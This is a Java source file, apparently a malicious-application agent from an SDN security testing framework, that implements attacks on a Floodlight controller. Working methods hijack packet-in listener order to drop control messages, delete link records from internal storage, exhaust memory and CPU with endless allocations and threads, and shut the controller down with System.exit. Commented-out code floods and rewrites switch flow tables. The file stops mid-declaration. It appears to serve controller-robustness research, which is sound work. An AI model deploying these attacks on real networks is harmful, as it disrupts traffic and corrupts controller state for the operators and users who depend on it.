package org.deltaproject.appagent;

import java.util.ArrayList;
import java.util.Collection;
import java.util.Date;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.ScheduledExecutorService;

import net.floodlightcontroller.core.FloodlightContext;
import net.floodlightcontroller.core.IFloodlightProviderService;
import net.floodlightcontroller.core.IOFMessageListener;
import net.floodlightcontroller.core.IOFSwitch;
import net.floodlightcontroller.core.IOFSwitchListener;
import net.floodlightcontroller.core.IShutdownService;
import net.floodlightcontroller.core.internal.IOFSwitchService;
import net.floodlightcontroller.core.module.FloodlightModuleContext;
import net.floodlightcontroller.core.module.FloodlightModuleException;
import net.floodlightcontroller.core.module.IFloodlightModule;
import net.floodlightcontroller.core.module.IFloodlightService;
import net.floodlightcontroller.debugcounter.IDebugCounterService;
import net.floodlightcontroller.debugevent.IDebugEventService;
import net.floodlightcontroller.devicemanager.IDeviceService;
import net.floodlightcontroller.linkdiscovery.ILinkDiscoveryListener;
import net.floodlightcontroller.linkdiscovery.ILinkDiscoveryService;
import net.floodlightcontroller.packet.Ethernet;
import net.floodlightcontroller.packet.IPacket;
import net.floodlightcontroller.packet.IPv4;
import net.floodlightcontroller.restserver.IRestApiService;
import net.floodlightcontroller.staticflowentry.IStaticFlowEntryPusherService;
import net.floodlightcontroller.storage.IResultSet;
import net.floodlightcontroller.storage.IStorageSourceService;
import net.floodlightcontroller.storage.memory.MemoryStorageSource;
import net.floodlightcontroller.threadpool.IThreadPoolService;
import net.floodlightcontroller.topology.ITopologyListener;
import net.floodlightcontroller.topology.ITopologyService;
import net.floodlightcontroller.topology.NodePortTuple;

import org.projectfloodlight.openflow.protocol.OFFlowMod;
import org.projectfloodlight.openflow.protocol.OFMessage;
import org.projectfloodlight.openflow.protocol.OFPacketIn;
import org.projectfloodlight.openflow.protocol.OFPortDesc;
import org.projectfloodlight.openflow.protocol.OFType;
import org.projectfloodlight.openflow.types.DatapathId;
import org.projectfloodlight.openflow.types.OFPort;
import org.projectfloodlight.openflow.util.HexString;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class AppAgent implements IFloodlightModule, IOFMessageListener,
		ILinkDiscoveryListener, IOFSwitchListener, ITopologyService {

	class CPU extends Thread {
		int result = 1;

		@Override
		public void run() {
			// TODO Auto-generated method stub
			while (true) {
				// try {
				// Thread.sleep(1);
				// } catch (InterruptedException e) {
				// // TODO Auto-generated catch block
				// e.printStackTrace();
				// }
				result = result ^ 2;
			}
		}
	}

	class EventTest extends Thread {
		int result = 1;
		protected IDebugEventService debugEventService;
		protected IDebugCounterService debugCounterService;

		public void setDebug(IDebugCounterService in) {
			this.debugCounterService = in;
		}

		@Override
		public void run() {
			// TODO Auto-generated method stub
			while (true) {
				// debugEventService
				// .resetAllModuleEvents("net.floodlightcontroller.devicemanager.internal");
				System.out.println("TEST");
				debugCounterService.resetAllCounters();
			}
		}
	}

	protected static Logger logger;

	private short FLOWMOD_DEFAULT_IDLE_TIMEOUT = (short) 0;
	private short FLOWMOD_DEFAULT_HARD_TIMEOUT = (short) 0;

	private static final String LINK_TABLE_NAME = "controller_link";
	private static final String LINK_ID = "id";

	protected IFloodlightProviderService floodlightProvider;

	protected IStorageSourceService storageSource;
	protected IDeviceService dservice;
	protected ILinkDiscoveryService linkDiscoveryService;
	protected IThreadPoolService threadPoolService;
	protected IOFSwitchService switchService;
	protected IRestApiService restApiService;
	protected IDebugCounterService debugCounterService;
	protected IDebugEventService debugEventService;
	protected IShutdownService shutdownService;

	public EventTest etest;

	protected MemoryStorageSource mt;
	static long[][] ary;
	protected OFFlowMod benign_flow;
	protected short benign_inport;

	// for S3
	private boolean isDrop;
	private OFPacketIn droppedPacket;
	private boolean isLoop;
	private SystemTime sys;
	private HashMap<String, Integer> map = new HashMap<>();

	private IStaticFlowEntryPusherService fservice;
	private Communication cm;

	public String getName() {
		// TODO Auto-generated method stub
		return AppAgent.class.getSimpleName();
	}

	@Override
	public Collection<Class<? extends IFloodlightService>> getModuleServices() {
		Collection<Class<? extends IFloodlightService>> l = new ArrayList<Class<? extends IFloodlightService>>();
		// l.add(ILinkDiscoveryService.class);
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public Map<Class<? extends IFloodlightService>, IFloodlightService> getServiceImpls() {

		// TODO Auto-generated method stub
		// Map<Class<? extends IFloodlightService>, IFloodlightService> m = new
		// HashMap<Class<? extends IFloodlightService>, IFloodlightService>();
		// m.put(ILinkDiscoveryService.class, this);
		return null;
	}

	@Override
	public Collection<Class<? extends IFloodlightService>> getModuleDependencies() {
		Collection<Class<? extends IFloodlightService>> l = new ArrayList<Class<? extends IFloodlightService>>();
		l.add(IFloodlightProviderService.class);
		l.add(ILinkDiscoveryService.class);
		l.add(IThreadPoolService.class);
		l.add(IOFSwitchService.class);
		l.add(IDebugCounterService.class);
		l.add(IDebugEventService.class);
		l.add(IRestApiService.class);
		l.add(IShutdownService.class);

		return l;
	}

	@Override
	public void init(FloodlightModuleContext context)
			throws FloodlightModuleException {
		// TODO Auto-generated method stub
		logger = LoggerFactory.getLogger(AppAgent.class);

		floodlightProvider = context
				.getServiceImpl(IFloodlightProviderService.class);

		mt = context.getServiceImpl(MemoryStorageSource.class);

		dservice = context.getServiceImpl(IDeviceService.class);
		fservice = context.getServiceImpl(IStaticFlowEntryPusherService.class);
		switchService = context.getServiceImpl(IOFSwitchService.class);
		storageSource = context.getServiceImpl(IStorageSourceService.class);
		threadPoolService = context.getServiceImpl(IThreadPoolService.class);
		restApiService = context.getServiceImpl(IRestApiService.class);
		debugCounterService = context
				.getServiceImpl(IDebugCounterService.class);
		debugEventService = context.getServiceImpl(IDebugEventService.class);
		shutdownService = context.getServiceImpl(IShutdownService.class);
		linkDiscoveryService = context
				.getServiceImpl(ILinkDiscoveryService.class);

		blockLLDPPacket();
		// cm = new Communication(this);
		// cm.setServerAddr("127.0.0.1", 3366);
		// cm.connectServer("AppAgent");
		// cm.start();
	}

	@Override
	public void startUp(FloodlightModuleContext context)
			throws FloodlightModuleException {
		// TODO Auto-generated method stub
		floodlightProvider.addOFMessageListener(OFType.PACKET_IN, this);
		floodlightProvider.addOFMessageListener(OFType.FLOW_REMOVED, this);
		floodlightProvider.addOFMessageListener(OFType.ERROR, this);

		floodlightProvider.addOFMessageListener(OFType.BARRIER_REPLY, this);
		floodlightProvider.addOFMessageListener(OFType.BARRIER_REQUEST, this);
		floodlightProvider.addOFMessageListener(OFType.ECHO_REPLY, this);
		floodlightProvider.addOFMessageListener(OFType.ECHO_REQUEST, this);
		floodlightProvider.addOFMessageListener(OFType.FEATURES_REPLY, this);
		floodlightProvider.addOFMessageListener(OFType.FEATURES_REQUEST, this);
		floodlightProvider.addOFMessageListener(OFType.FLOW_MOD, this);
		floodlightProvider.addOFMessageListener(OFType.GET_CONFIG_REPLY, this);
		floodlightProvider
				.addOFMessageListener(OFType.GET_CONFIG_REQUEST, this);
		floodlightProvider.addOFMessageListener(OFType.HELLO, this);
		floodlightProvider.addOFMessageListener(OFType.PACKET_OUT, this);
		floodlightProvider.addOFMessageListener(OFType.PORT_MOD, this);
		floodlightProvider.addOFMessageListener(OFType.PORT_STATUS, this);
		floodlightProvider.addOFMessageListener(OFType.QUEUE_GET_CONFIG_REPLY,
				this);
		floodlightProvider.addOFMessageListener(
				OFType.QUEUE_GET_CONFIG_REQUEST, this);
		floodlightProvider.addOFMessageListener(OFType.SET_CONFIG, this);
		floodlightProvider.addOFMessageListener(OFType.STATS_REPLY, this);
		floodlightProvider.addOFMessageListener(OFType.STATS_REQUEST, this);
		// sniffingListener();
	}

	// A-2-M
	public boolean Set_Control_Message_Drop() {
		System.out.println("[AppAgent] Control_Message_Drop");
		isDrop = true;

		List<IOFMessageListener> listeners = floodlightProvider.getListeners()
				.get(OFType.PACKET_IN);

		IOFMessageListener temp = null;
		for (IOFMessageListener listen : listeners) {
			if (listen.getName().equals("AppAgent")) {
				temp = listen;
			}

			floodlightProvider
					.removeOFMessageListener(OFType.PACKET_IN, listen);
		}

		for (IOFMessageListener listen : listeners) {
			floodlightProvider.addOFMessageListener(OFType.PACKET_IN, temp);
			if (!listen.getName().equals("AppAgent")) {
				floodlightProvider.addOFMessageListener(OFType.PACKET_IN,
						listen);
			}
		}

		listeners = floodlightProvider.getListeners().get(OFType.PACKET_IN);

		for (IOFMessageListener listen : listeners) {
			System.out.println(listen.getName());
		}

		return true;
	}

	public String Control_Message_Drop() {
		System.out.println("[AppAgent] Control_Message_Drop");
		String drop = "nothing";

		for (int i = 0; i < 10; i++) {
			while (this.droppedPacket == null) {
				try {
					Thread.sleep(1000);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		}

		if (droppedPacket != null) {
			drop = droppedPacket.toString();
		}

		return drop;
	}

	public boolean Set_Infinite_Loop() {
		System.out.println("[AppAgent] Set_Infinite_Loop");
		this.isLoop = true;

		return true;
	}

	public static boolean Infinite_Loop() {
		System.out.println("[AppAgent] Infinite_Loop");
		int i = 0;

		while (i < 100) {
			i++;

			if (i == 99)
				i = 0;
		}

		return true;
	}

	// A-3-M
	public String Internal_Storage_Abuse() {
		logger.info("[ATTACK] Internal Storage Manipulation");
		String deletedInfo = "nothing";

		IResultSet link = storageSource.executeQuery(LINK_TABLE_NAME, null,
				null, null);
		int count = 0;
		List<String> linkIdList = new LinkedList<String>();

		InternalDBShow.show(storageSource);

		while (link.next()) {
			try {
				count++;
				linkIdList.add(link.getString(LINK_ID));

			} catch (NullPointerException e) {
				e.printStackTrace();
			}
		}

		if (0 < count) {
			logger.info("[ATTACK] Access InternalDB : delete Link Information");
			logger.info("[ATTACK] delete Link Info: " + linkIdList.get(0));
			storageSource.deleteRow(LINK_TABLE_NAME, linkIdList.get(0));
			deletedInfo = linkIdList.get(0).toString();
		}

		InternalDBShow.show(storageSource);
		return deletedInfo;
	}

	// A-5-M
	// public String Flow_Rule_Modification() {
	// System.out.println("[AppAgent] Flow_Rule_Modification");
	//
	// String result = "";
	//
	// List<IOFSwitch> switches = new ArrayList<IOFSwitch>();
	// Map<Long, IOFSwitch> switchMap = floodlightProvider.getAllSwitchMap();
	// for (java.util.Map.Entry<Long, IOFSwitch> entry : switchMap.entrySet()) {
	// switches.add(entry.getValue());
	// }
	//
	// for (IOFSwitch sw : switches) {
	// List<OFFlowStatisticsReply> flowTable = getSwitchFlowTable(sw,
	// (short) -1);
	// System.out.println("Table size : " + flowTable.size());
	// for (OFFlowStatisticsReply flow : flowTable) {
	// System.out.println(flow);
	//
	// List<OFAction> actions = new ArrayList<OFAction>();
	// actions.add(new OFActionOutput().setMaxLength((short) 0xffff));
	//
	// OFMatch match = flow.getMatch().clone();
	// match.setWildcards(flow.getMatch().clone().getWildcards());
	//
	// OFMessage fm = ((OFFlowMod) floodlightProvider
	// .getOFMessageFactory().getMessage(OFType.FLOW_MOD))
	// .setMatch(match)
	// .setCookie(flow.getCookie())
	// .setCommand(OFFlowMod.OFPFC_DELETE)
	// .setActions(actions)
	// .setLengthU(
	// OFFlowMod.MINIMUM_LENGTH
	// + (OFActionOutput.MINIMUM_LENGTH * actions
	// .size()));
	//
	// OFMessage fm2 = ((OFFlowMod) floodlightProvider
	// .getOFMessageFactory().getMessage(OFType.FLOW_MOD))
	// .setMatch(match)
	// .setCookie(flow.getCookie())
	// .setCommand(OFFlowMod.OFPFC_ADD)
	// .setActions(actions)
	// .setLengthU(
	// OFFlowMod.MINIMUM_LENGTH
	// + (OFActionOutput.MINIMUM_LENGTH * actions
	// .size()));
	//
	// try {
	// List<OFMessage> msglist = new ArrayList<OFMessage>(2);
	// msglist.add(fm);
	// msglist.add(fm2);
	// sw.write(msglist, null);
	// sw.flush();
	//
	// result = "success|" + fm.toString() + "->" + fm2.toString();
	// } catch (Exception e) {
	// logger.error("Failed to clear flows on switch {} - {}",
	// this, e);
	// }
	// }
	// }
	//
	// return result;
	// }

	public void Flow_Table_Clearance(boolean isLoop) {
		// System.out.println("[AppAgent] Flow_Table_Clearance");
		//
		// int cnt = 1;
		//
		// /* forever */
		// List<IOFSwitch> switches = new ArrayList<IOFSwitch>();
		// Map<Long, IOFSwitch> switchMap =
		// floodlightProvider.getAllSwitchMap();
		// for (java.util.Map.Entry<Long, IOFSwitch> entry :
		// switchMap.entrySet()) {
		// switches.add(entry.getValue());
		// }
		//
		// for (int i = 0; i < cnt; i++) {
		//
		// for (IOFSwitch sw : switches) {
		// // sw.clearAllFlowMods();
		// // fservice.deleteAllFlows();
		// List<OFFlowStatisticsReply> flowTable = getSwitchFlowTable(sw,
		// (short) -1);
		// for (OFFlowStatisticsReply flow : flowTable) {
		// System.out.println(flow);
		//
		// List<OFAction> actions = new ArrayList<OFAction>();
		// actions.add(new OFActionOutput()
		// .setMaxLength((short) 0xffff));
		//
		// OFMatch match = flow.getMatch().clone();
		// match.setWildcards(flow.getMatch().clone().getWildcards());
		//
		// OFMessage fm = ((OFFlowMod) floodlightProvider
		// .getOFMessageFactory().getMessage(OFType.FLOW_MOD))
		// .setMatch(match)
		// .setCookie(flow.getCookie())
		// .setCommand(OFFlowMod.OFPFC_DELETE)
		// .setActions(actions)
		// .setLengthU(
		// OFFlowMod.MINIMUM_LENGTH
		// + (OFActionOutput.MINIMUM_LENGTH * actions
		// .size()));
		//
		// try {
		// List<OFMessage> msglist = new ArrayList<OFMessage>(1);
		// msglist.add(fm);
		// sw.write(msglist, null);
		// sw.flush();
		// } catch (Exception e) {
		// logger.error("Failed to clear flows on switch {} - {}",
		// this, e);
		// }
		// }
		//
		// if (isLoop)
		// i = -1;
		// }
		// }
	}

	// A-6-M
	public String Event_Listener_Unsubscription() {
		List<IOFMessageListener> listeners = floodlightProvider.getListeners()
				.get(OFType.PACKET_IN);

		String removed = "";
		for (IOFMessageListener listen : listeners) {
			logger.info("[ATTACK] PACKET_IN LIST");
			logger.info("[ATTACK] " + listen.getName());
		}

		for (IOFMessageListener listen : listeners) {
			if (listen.getName().equals("forwarding")) {
				logger.info("\n\n[ATTACK] REMOVE: " + listen.getName());

				removed = "forwarding";
//				floodlightProvider.removeOFMessageListener(OFType.PACKET_IN,
//						listen);
			}
		}
		return removed;
	}

	/*
	 * A-7-M
	 */
	public void Resource_Exhaustion_Mem() {
		System.out.println("[AppAgent] Resource Exhausion : Mem");
		ArrayList<long[][]> arry;
		// ary = new long[Integer.MAX_VALUE][Integer.MAX_VALUE];
		arry = new ArrayList<long[][]>();
		while (true) {
			arry.add(new long[Integer.MAX_VALUE][Integer.MAX_VALUE]);
		}
	}

	public boolean Resource_Exhaustion_CPU() {
		System.out.println("[AppAgent] Resource Exhausion : CPU");
		int thread_count = 0;

		for (int count = 0; count < 100; count++) {
			CPU cpu_thread = new CPU();
			cpu_thread.start();
			thread_count++;
		}

		return true;
	}

	/*
	 * A-8-M
	 */
	public boolean System_Variable_Manipulation() {
		System.out.println("[AppAgent] System_Variable_Manipulation");
		this.sys = new SystemTime();
		sys.start();
		return true;
	}

	/*
	 * A-9-M
	 */
	public boolean System_Command_Execution() {
		System.out.println("[AppAgent] System_Command_Execution");
		System.exit(0);

		return true;
	}

	/*
	 * C-1-A
	 */
	// public boolean Flow_Rule_Flooding() {
	// System.out.println("[AppAgent] Flow_Rule_Flooding");
	//
	// List<IOFSwitch> switches = new ArrayList<IOFSwitch>();
	// Map<Long, IOFSwitch> switchMap = floodlightProvider.getAllSwitchMap();
	// for (java.util.Map.Entry<Long, IOFSwitch> entry : switchMap.entrySet()) {
	// switches.add(entry.getValue());
	// }
	//
	// Random random = new Random();
	//
	// OFMatch match = new OFMatch();
	// match.setDataLayerSource("ff:ff:ff:ff:ff:ff");
	// match.setDataLayerDestination("ff:ff:ff:ff:ff:ff");
	//
	// for (int i = 0; i < 32767; i++) {
	// OFFlowMod fm = (OFFlowMod) floodlightProvider.getOFMessageFactory()
	// .getMessage(OFType.FLOW_MOD);
	//
	// // short inPort = 0;
	//
	// List<OFAction> actions = new ArrayList<OFAction>();
	// actions.add(new OFActionOutput().setMaxLength((short) 0xffff));
	//
	// fm.setIdleTimeout(FLOWMOD_DEFAULT_IDLE_TIMEOUT)
	// .setHardTimeout(FLOWMOD_DEFAULT_HARD_TIMEOUT)
	// .setBufferId(OFPacketOut.BUFFER_ID_NONE)
	// .setCookie(random.nextInt())
	// .setCommand(OFFlowMod.OFPFC_ADD)
	// .setActions(actions)
	// .setPriority((short) random.nextInt(32767))
	// .setLengthU(
	// OFFlowMod.MINIMUM_LENGTH
	// + (OFActionOutput.MINIMUM_LENGTH * actions
	// .size()));
	//
	// fm.setMatch(match.clone().setWildcards(
	// Wildcards.FULL.matchOn(Flag.IN_PORT).matchOn(Flag.DL_TYPE)
	// .matchOn(Flag.DL_SRC).matchOn(Flag.DL_DST)));
	//
	// // set input and output ports on the switch
	// // fm.getMatch().setInputPort(inPort);
	//
	// try {
	// for (IOFSwitch sw : switches) {
	// sw.write(fm, null);
	// sw.flush();
	// }
	// } catch (Exception e) {
	//
	// }
	// }
	//
	// return true;
	// }
	//
	// /*
	// * C-2-M
	// */
	// public String Switch_Firmware_Misuse() {
	// String result = "";
	//
	// List<IOFSwitch> switches = new ArrayList<IOFSwitch>();
	// Map<Long, IOFSwitch> switchMap = floodlightProvider.getAllSwitchMap();
	// for (java.util.Map.Entry<Long, IOFSwitch> entry : switchMap.entrySet()) {
	// switches.add(entry.getValue());
	// }
	//
	// for (IOFSwitch sw : switches) {
	// List<OFFlowStatisticsReply> flowTable = getSwitchFlowTable(sw,
	// (short) -1);
	// // System.out.println("Table size : " + flowTable.size());
	// for (OFFlowStatisticsReply flow : flowTable) {
	// // System.out.println(flow);
	//
	// List<OFAction> actions = new ArrayList<OFAction>();
	// actions.add(new OFActionOutput().setMaxLength((short) 0xffff));
	//
	// int dst = 0;
	// int src = 0;
	//
	// String srcS = HexString.toHexString(flow.getMatch()
	// .getDataLayerSource());
	// String dstS = HexString.toHexString(flow.getMatch()
	// .getDataLayerDestination());
	// dst = map.get(dstS);
	// src = map.get(srcS);
	//
	// OFMatch newmatch = flow.getMatch().clone();
	// newmatch.setDataLayerType((short) 0x800);
	// newmatch.setNetworkDestination(dst);
	// newmatch.setNetworkSource(src);
	// newmatch.setWildcards(Wildcards.FULL.matchOn(Flag.IN_PORT)
	// .matchOn(Flag.DL_TYPE).withNwSrcMask(32)
	// .withNwDstMask(32));
	//
	// OFMessage fm = ((OFFlowMod) floodlightProvider
	// .getOFMessageFactory().getMessage(OFType.FLOW_MOD))
	// .setMatch(flow.getMatch().clone())
	// .setCookie(flow.getCookie())
	// .setCommand(OFFlowMod.OFPFC_DELETE);
	//
	// OFMessage fm2 = ((OFFlowMod) floodlightProvider
	// .getOFMessageFactory().getMessage(OFType.FLOW_MOD))
	// .setMatch(newmatch)
	// .setCookie(flow.getCookie())
	// .setCommand(OFFlowMod.OFPFC_ADD)
	// .setActions(flow.getActions())
	// .setLengthU(
	// OFFlowMod.MINIMUM_LENGTH
	// + (OFActionOutput.MINIMUM_LENGTH * flow
	// .getActions().size()));
	//
	// try {
	// List<OFMessage> msglist = new ArrayList<OFMessage>(2);
	// msglist.add(fm);
	// msglist.add(fm2);
	// sw.write(msglist, null);
	// sw.flush();
	//
	// result = "success|" + fm.toString() + "\n->"
	// + fm2.toString();
	// logger.info("[ATTACK] " + result);
	// } catch (Exception e) {
	// logger.error("Failed to clear flows on switch {} - {}",
	// this, e);
	// }
	// }
	// }
	//
	// return result;
	// }

	// Get flow table in the switch
	// public List<OFFlowStatsReply> getSwitchFlowTable(IOFSwitch sw,
	// Short outPort) {
	// List<OFFlowStatsReply> statsReply = new
	// ArrayList<OFFlowStatisticsReply>();
	// List<OFStatistics> values = null;
	// Future<List<OFStatistics>> future;
	//
	// // Statistics request object for getting flows
	// OFStatisticsRequest req = new OFStatisticsRequest();
	// req.setStatisticType(OFStatisticsType.FLOW);
	// int requestLength = req.getLengthU();
	//
	// OFFlowStatisticsRequest specificReq = new OFFlowStatisticsRequest();
	//
	// specificReq.setMatch(new OFMatch().setWildcards(-1));
	// specificReq.setOutPort(outPort);
	// specificReq.setTableId((byte) 0xff);
	//
	// req.setStatistics(Collections.singletonList((OFStatistics) specificReq));
	// requestLength += specificReq.getLength();
	// req.setLengthU(requestLength);
	//
	// try {
	// future = sw.queryStatistics(req);
	// values = future.get(10, TimeUnit.SECONDS);
	// if (values != null) {
	// for (OFStatistics stat : values) {
	// // System.out.println("stats : " + stat);
	// statsReply.add((OFFlowStatisticsReply) stat);
	// }
	// }
	// } catch (Exception e) {
	// System.out.println("Failure retrieving statistics from switch "
	// + sw);
	// }
	//
	// return statsReply;
	// }

	// @Override
	// public net.floodlightcontroller.core.IListener.Command receive(
	// IOFSwitch sw, OFMessage msg, FloodlightContext cntx) {
	// // TODO Auto-generated method stub
	// return null;
	// }

	public void blockLLDPPacket() {
		for (DatapathId sw : switchService.getAllSwitchDpids()) {
			IOFSwitch iofSwitch = switchService.getSwitch(sw);
			// if (iofSwitch == null)
			// continue;
			// if (!iofSwitch.isActive())
			// continue; /* can't do anything if the switch is SLAVE */
			if (iofSwitch.getEnabledPorts() != null) {
				for (OFPortDesc ofp : iofSwitch.getEnabledPorts()) {
					this.linkDiscoveryService.AddToSuppressLLDPs(sw,
							ofp.getPortNo());
					System.out.println("Blocking");

				}
			}
		}

		/*
		 * net.floodlightcontroller.linkdiscovery.internal OFSwitchManager
		 * net.floodlightcontroller.topology net.floodlightcontroller.core
		 * net.floodlightcontroller.devicemanager.internal
		 */
		// List<String> list = debugEventService.getModuleList();
		// for (String s : list) {
		// System.out.println("module: " + s);
		// }

		// List<EventInfoResource> elist =
		// debugEventService.getAllEventHistory();
		// for(EventInfoResource e : elist) {
		// System.out.println("event :"+e.toString());
		// }

		ScheduledExecutorService ses = threadPoolService.getScheduledExecutor();
	}

	@Override
	public Command receive(IOFSwitch sw, OFMessage msg, FloodlightContext cntx) {
		// TODO Auto-generated method stub
		switch (msg.getType()) {
		case PACKET_IN:

			// blockLLDPPacket();
//			sniffingListener();

			OFPacketIn pi = (OFPacketIn) msg;

			Ethernet eth = IFloodlightProviderService.bcStore.get(cntx,
					IFloodlightProviderService.CONTEXT_PI_PAYLOAD);

			IPacket pkt = eth.getPayload();
			IPv4 ip_pkt = null;

			if (pkt instanceof IPv4) {
//				ip_pkt = (IPv4) pkt;
//
//				map.put(HexString.toHexString(eth.getDestinationMACAddress()
//						.getBytes()), ip_pkt.getDestinationAddress().getInt());
//
//				map.put(HexString.toHexString(eth.getSourceMACAddress()
//						.getBytes()), ip_pkt.getSourceAddress().getInt());

			}

			if (droppedPacket == null) {
				this.Set_Control_Message_Drop();
				droppedPacket = pi;
			} else {
				IFloodlightProviderService.bcStore.remove(cntx,
						IFloodlightProviderService.CONTEXT_PI_PAYLOAD);
				
			}
			
			return Command.CONTINUE;

		case STATS_REPLY:
			System.out.println("STATS_REPLY receive");
			break;

		case FEATURES_REPLY:
			System.out.println("FEATURES_REPLY receive");
			break;

		case GET_CONFIG_REPLY:
			System.out.println("GET_CONFIG_REPLY receive");
			break;

		case PORT_MOD:
			System.out.println("PORT_MOD receive");
			break;

		case PORT_STATUS:
			System.out.println("PORT_STATUS receive");
			break;

		case SET_CONFIG:
			System.out.println("SET_CONFIG receive");
			break;

		case FLOW_MOD:
			System.out.println(msg.toString());
			System.out.println("FLow_MOD receive");
			looping();
			// break;

		case PACKET_OUT:
			System.out.println("Packet-Out receive");
			System.out.println(msg.toString());
			break;

		default:
			System.out.println("others receive");
			System.out.println(msg.toString());
			break;
		}

		return Command.CONTINUE;
	}

	public void looping() {
		while (true) {
			System.out.println("Hlelo");
		}
	}

	public void sniffingListener() {
		List<IOFMessageListener> packetin_listeners = floodlightProvider
				.getListeners().get(OFType.PACKET_IN);
		List<IOFMessageListener> removed_listeners = floodlightProvider
				.getListeners().get(OFType.FLOW_REMOVED);
		List<IOFMessageListener> features_listeners = floodlightProvider
				.getListeners().get(OFType.FEATURES_REPLY);
		List<IOFMessageListener> status_listeners = floodlightProvider
				.getListeners().get(OFType.STATS_REPLY);
		List<IOFMessageListener> config_listeners = floodlightProvider
				.getListeners().get(OFType.GET_CONFIG_REPLY);
		List<IOFMessageListener> setconfig_listeners = floodlightProvider
				.getListeners().get(OFType.PORT_STATUS);
		List<IOFMessageListener> qyeue_listeners = floodlightProvider
				.getListeners().get(OFType.QUEUE_GET_CONFIG_REPLY);

		logger.info("[ATTACK] Packet-In Listener : " + packetin_listeners.size());
		// IOFMessageListener temp = packetin_listeners.get(0);
		// packetin_listeners.set(packetin_listeners.size() - 1, temp);
		// packetin_listeners.set(0, this);

		for (IOFMessageListener listen : packetin_listeners) {
			logger.info("[ATTACK] [" + listen.getName() + "] APPLICATION");
		}

		// for (IOFMessageListener listen : port_listeners)
		// {
		// logger.info("[ATTACK] ["
		// +listen.getName()+"] APPLICATION IN THE PORT_STATUS LIST");
		// }

		// for (IOFMessageListener listen : packetin_listeners)
		// {
		// logger.info("[ATTACK] ["
		// +listen.getName()+"] APPLICATION IN THE PACKET_IN LIST");
		// }

		// for (IOFMessageListener listen : features_listeners) {
		// logger.info("[ATTACK] [" + listen.getName()
		// + "] APPLICATION IN THE FEATURES_REPLY LIST");
		// }
		// for (IOFMessageListener listen : status_listeners) {
		// logger.info("[ATTACK] [" + listen.getName()
		// + "] APPLICATION IN THE STATS_REPLY LIST");
		// }
	}

	@Override
	public boolean isCallbackOrderingPrereq(OFType type, String name) {
		// TODO Auto-generated method stub
		return false;
	}

	@Override
	public boolean isCallbackOrderingPostreq(OFType type, String name) {
		// TODO Auto-generated method stub
		return false;
	}

	@Override
	public void linkDiscoveryUpdate(LDUpdate update) {
		System.out.println("HellO?");
		// TODO Auto-generated method stub
	}

	@Override
	public void linkDiscoveryUpdate(List<LDUpdate> updateList) {
		// TODO Auto-generated method stub
		System.out.println("HellO?");

	}

	@Override
	public void switchAdded(DatapathId switchId) {
		// TODO Auto-generated method stub

	}

	@Override
	public void switchRemoved(DatapathId switchId) {
		// TODO Auto-generated method stub

	}

	@Override
	public void switchActivated(DatapathId switchId) {
		// TODO Auto-generated method stub

	}

	@Override
	public void switchPortChanged(DatapathId switchId, OFPortDesc port,
			net.floodlightcontroller.core.PortChangeType type) {
		// TODO Auto-generated method stub

	}

	@Override
	public void switchChanged(DatapathId switchId) {
		// TODO Auto-generated method stub

	}

	@Override
	public void addListener(ITopologyListener listener) {
		// TODO Auto-generated method stub

	}

	@Override
	public Date getLastUpdateTime() {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public boolean isAttachmentPointPort(DatapathId switchid, OFPort port) {
		// TODO Auto-generated method stub
		return false;
	}

	@Override
	public boolean isAttachmentPointPort(DatapathId switchid, OFPort port,
			boolean tunnelEnabled) {
		// TODO Auto-generated method stub
		return false;
	}

	@Override
	public DatapathId getOpenflowDomainId(DatapathId switchId) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public DatapathId getOpenflowDomainId(DatapathId switchId,
			boolean tunnelEnabled) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public DatapathId getL2DomainId(DatapathId switchId) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public DatapathId getL2DomainId(DatapathId switchId, boolean tunnelEnabled) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public boolean inSameOpenflowDomain(DatapathId switch1, DatapathId switch2) {
		// TODO Auto-generated method stub
		return false;
	}

	@Override
	public boolean inSameOpenflowDomain(DatapathId switch1, DatapathId switch2,
			boolean tunnelEnabled) {
		// TODO Auto-generated method stub
		return false;
	}

	@Override
	public Set<DatapathId> getSwitchesInOpenflowDomain(DatapathId switchDPID) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public Set<DatapathId> getSwitchesInOpenflowDomain(DatapathId switchDPID,
			boolean tunnelEnabled) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public boolean inSameL2Domain(DatapathId switch1, DatapathId switch2) {
		// TODO Auto-generated method stub
		return false;
	}

	@Override
	public boolean inSameL2Domain(DatapathId switch1, DatapathId switch2,
			boolean tunnelEnabled) {
		// TODO Auto-generated method stub
		return false;
	}

	@Override
	public boolean isBroadcastDomainPort(DatapathId sw, OFPort port) {
		// TODO Auto-generated method stub
		return false;
	}

	@Override
	public boolean isBroadcastDomainPort(DatapathId sw, OFPort port,
			boolean tunnelEnabled) {
		// TODO Auto-generated method stub
		return false;
	}

	@Override
	public boolean isAllowed(DatapathId sw, OFPort portId) {
		// TODO Auto-generated method stub
		return false;
	}

	@Override
	public boolean isAllowed(DatapathId sw, OFPort portId, boolean tunnelEnabled) {
		// TODO Auto-generated method stub
		return false;
	}

	@Override
	public boolean isConsistent(DatapathId oldSw, OFPort oldPort,
			DatapathId newSw, OFPort newPort) {
		// TODO Auto-generated method stub
		return false;
	}

	@Override
	public boolean isConsistent(DatapathId oldSw, OFPort oldPort,
			DatapathId newSw, OFPort newPort, boolean tunnelEnabled) {
		// TODO Auto-generated method stub
		return false;
	}

	@Override
	public boolean isInSameBroadcastDomain(DatapathId s1, OFPort p1,
			DatapathId s2, OFPort p2) {
		// TODO Auto-generated method stub
		return false;
	}

	@Override
	public boolean isInSameBroadcastDomain(DatapathId s1, OFPort p1,
			DatapathId s2, OFPort p2, boolean tunnelEnabled) {
		// TODO Auto-generated method stub
		return false;
	}

	@Override
	public Set<OFPort> getPortsWithLinks(DatapathId sw) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public Set<OFPort> getPortsWithLinks(DatapathId sw, boolean tunnelEnabled) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public Set<OFPort> getBroadcastPorts(DatapathId targetSw, DatapathId src,
